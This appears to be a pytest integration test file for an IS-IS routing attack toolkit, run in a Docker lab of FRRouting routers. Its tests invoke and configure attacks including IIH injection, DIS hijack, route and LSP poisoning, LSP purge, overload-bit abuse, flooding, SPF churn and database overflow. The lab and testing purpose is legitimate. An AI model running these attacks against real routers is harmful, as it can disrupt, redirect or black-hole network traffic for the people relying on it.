"""Integration tests for ISIS Protocol Attack — Docker FRR topology.

Requires: Docker Desktop + FRRouting
Run: docker compose -f docker/topo1-single-area/docker-compose.yml up -d
     pytest tests/integration/ -v
     docker compose -f docker/topo1-single-area/docker-compose.yml down -v
"""
import pytest
import time
from .conftest import (
    R1, R2, ATTACKER,
    docker_exec, frr_vtysh,
    get_isis_neighbors, get_isis_database, get_ip_routes, get_isis_db_count,
    wait_for_isis_convergence,
    run_attack_in_container, run_attack_script,
)


# ============================
# Topology Smoke Tests
# ============================

@pytest.mark.order(1)
def test_containers_running(docker_network):
    """Verify all 3 containers are running."""
    for container in [R1, R2, ATTACKER]:
        out = docker_exec(container, ["hostname"])
        assert out.strip(), f"{container} not responding"


@pytest.mark.order(2)
def test_isis_neighbor_up_r1(docker_network):
    """R1 has at least 1 ISIS adjacency Up."""
    nbrs = get_isis_neighbors(R1)
    up_found = any(c.get("state") == "Up" for c in nbrs)
    assert up_found, f"No Up neighbors on R1: {nbrs}"


@pytest.mark.order(3)
def test_isis_neighbor_up_r2(docker_network):
    """R2 has at least 1 ISIS adjacency Up."""
    nbrs = get_isis_neighbors(R2)
    up_found = any(c.get("state") == "Up" for c in nbrs)
    assert up_found, f"No Up neighbors on R2: {nbrs}"


@pytest.mark.order(4)
def test_isis_database_populated(docker_network):
    """Both routers have LSPs in their database."""
    db1 = get_isis_database(R1)
    db2 = get_isis_database(R2)
    assert db1, "R1 ISIS database is empty"
    assert db2, "R2 ISIS database is empty"


@pytest.mark.order(5)
def test_routes_learned(docker_network):
    """R1 and R2 have learned ISIS routes."""
    routes1 = get_ip_routes(R1)
    routes2 = get_ip_routes(R2)
    assert len(routes1) >= 2, f"R1 has only {len(routes1)} routes"
    assert len(routes2) >= 2, f"R2 has only {len(routes2)} routes"


# ============================
# Adjacency Attack Tests
# ============================

@pytest.mark.order(6)
def test_iih_inject_sends_packets(docker_network, attacker):
    """IIH inject attack sends packets on the wire."""
    script = """
from isis_attack.attacks.adjacency.iih_inject import IIHInjectAttack
from isis_attack.config.types import IIHConfig

config = IIHConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="9999.9999.9999",
    area_addr="49.0001",
    level=1,
    priority=127,
    sniff_duration=2,
    packet_rate=100,
)
attack = IIHInjectAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
print(f"DETAILS={result.details}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


@pytest.mark.order(7)
def test_dis_hijack_sends_priority_127(docker_network, attacker):
    """DIS hijack sends IIH with max priority."""
    script = """
from isis_attack.attacks.adjacency.dis_hijack import DISHijackAttack
from isis_attack.config.types import IIHConfig

config = IIHConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="AAAA.AAAA.AAAA",
    area_addr="49.0001",
    level=1,
    priority=127,
    sniff_duration=2,
    packet_rate=100,
)
attack = DISHijackAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


@pytest.mark.order(8)
def test_adjacency_break_sends_malformed(docker_network, attacker):
    """Adjacency break sends IIH with wrong area + hold=0."""
    script = """
from isis_attack.attacks.adjacency.adjacency_break import AdjacencyBreakAttack
from isis_attack.config.types import IIHConfig

config = IIHConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="BBBB.BBBB.BBBB",
)
attack = AdjacencyBreakAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


# ============================
# LSP Attack Tests
# ============================

@pytest.mark.order(9)
def test_route_inject_poisons_lsdb(docker_network, attacker):
    """Route inject sends a poisoned LSP into the database."""
    db_before = get_isis_db_count(R1)

    script = """
from isis_attack.attacks.lsp.route_inject import RouteInjectAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="CCCC.CCCC.CCCC",
    lsp_id="CCCC.CCCC.CCCC.00-00",
    level=1,
    sequence=5,
    remaining_lifetime=1200,
    metric=777,
    network_addr="10.99.99.0",
    network_mask="255.255.255.0",
)
attack = RouteInjectAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


@pytest.mark.order(10)
def test_max_seq_injects_max_sequence(docker_network, attacker):
    """Max seq attack sends LSP with 0xFFFFFFFF sequence number."""
    script = """
from isis_attack.attacks.lsp.max_seq import MaxSeqAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="DDDD.DDDD.DDDD",
    lsp_id="DDDD.DDDD.DDDD.00-00",
    level=1,
)
attack = MaxSeqAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


@pytest.mark.order(11)
def test_purge_lsp_sends_lifetime_zero(docker_network, attacker):
    """Purge LSP attack sends LSP with Remaining Lifetime=0."""
    script = """
from isis_attack.attacks.lsp.purge_lsp import PurgeLSPAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="EEEE.EEEE.EEEE",
    lsp_id="EEEE.EEEE.EEEE.00-00",
    level=1,
)
attack = PurgeLSPAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


@pytest.mark.order(12)
def test_overload_bit_sets_ol(docker_network, attacker):
    """Overload bit attack sets OL bit in LSP."""
    script = """
from isis_attack.attacks.lsp.overload_bit import OverloadBitAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="FFFF.FFFF.FFFF",
    lsp_id="FFFF.FFFF.FFFF.00-00",
    level=1,
)
attack = OverloadBitAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out


# ============================
# DoS Attack Tests
# ============================

@pytest.mark.order(13)
def test_flood_sends_many_packets(docker_network, attacker):
    """Flood attack sends many IIH packets."""
    script = """
from isis_attack.attacks.dos.flood import FloodAttack
from isis_attack.config.types import DoSConfig

config = DoSConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="FFFF.FFFF.FFFF",
    thread_count=1,
    duration=2,
    packet_rate=200,
)
attack = FloodAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, out
    # Extract packet count
    import re
    m = re.search(r"PACKETS=(\d+)", out)
    if m:
        count = int(m.group(1))
        assert count >= 1, f"Expected >=1 packets, got {count}"


@pytest.mark.order(14)
def test_spf_recalc_causes_spf_runs(docker_network, attacker):
    """SPF recalc sends changing LSPs to force SPF."""
    script = """
import traceback
try:
    from isis_attack.attacks.dos.spf_recalc import SPFRecalcAttack
    from isis_attack.config.types import DoSConfig

    config = DoSConfig(
        iface="eth0",
        target="01:80:C2:00:00:14",
        sys_id="1921.6800.FA0E",
        level=1,
        duration=3,
        lsp_change_interval=0.5,
        packet_rate=100,
    )
    attack = SPFRecalcAttack(config)
    result = attack.run()
    print(f"SUCCESS={result.success}")
    print(f"PACKETS={result.packets_sent}")
except Exception:
    traceback.print_exc()
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"SPF recalc failed: {out}"


@pytest.mark.order(15)
def test_db_overflow_fills_lsdb(docker_network, attacker):
    """DB overflow injects many LSPs."""
    db_before = get_isis_db_count(R1)

    script = """
from isis_attack.attacks.dos.db_overflow import DBOverflowAttack
from isis_attack.config.types import DoSConfig

config = DoSConfig(
    iface="eth0",
    target="01:80:C2:00:00:14",
    sys_id="DB00.0000.0001",
    level=1,
    lsp_count=10,
    packet_rate=200,
)
attack = DBOverflowAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=30)
    assert "SUCCESS=True" in out, out


# ============================
# Protocol Attack Tests
# ============================

@pytest.mark.order(16)
def test_replay_requires_capture_file(docker_network, attacker):
    """Replay attack fails gracefully without capture file."""
    script = """
from isis_attack.attacks.protocol.replay import ReplayAttack
from isis_attack.config.types import ReplayConfig

config = ReplayConfig(iface="eth0", target="01:80:C2:00:00:14")
attack = ReplayAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"DETAILS={result.details}")
"""
    out = run_attack_script(script, timeout=15)
    assert "capture_file" in out, out
